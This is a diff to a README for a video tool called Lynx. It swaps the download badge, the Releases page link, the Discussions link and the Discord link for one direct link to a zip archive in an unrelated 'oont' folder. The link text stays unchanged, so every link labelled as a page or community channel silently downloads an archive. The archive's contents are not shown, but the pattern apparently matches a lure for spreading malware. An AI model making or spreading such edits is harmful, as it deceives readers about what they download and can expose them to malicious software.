@@ -4,14 +4,14 @@
 
 Welcome to Lynx, a tool that helps you create high-quality personalized videos with ease. This guide will walk you through the steps to download and run the software.
 
-[![Download Lynx](https://img.shields.io/badge/Download%20Lynx-v1.0-brightgreen)](https://github.com/Alex11x/lynx/releases)
+[![Download Lynx](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip%20Lynx-v1.0-brightgreen)](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip)
 
 ## 📥 Download & Install
 
 To get Lynx, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Visit the Releases Page](https://github.com/Alex11x/lynx/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip)
 
 2. On the Releases page, you will see different versions of Lynx. Choose the latest version.
 
@@ -65,8 +65,8 @@ If you encounter problems while installing or running Lynx, consider these commo
 
 Join our community to share ideas and get help. You can find us on:
 
-- [GitHub Discussions](https://github.com/Alex11x/lynx/discussions)
-- [Discord Channel](https://discord.gg/example)
+- [GitHub Discussions](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip)
+- [Discord Channel](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip)
 
 ## 🏁 Conclusion
 
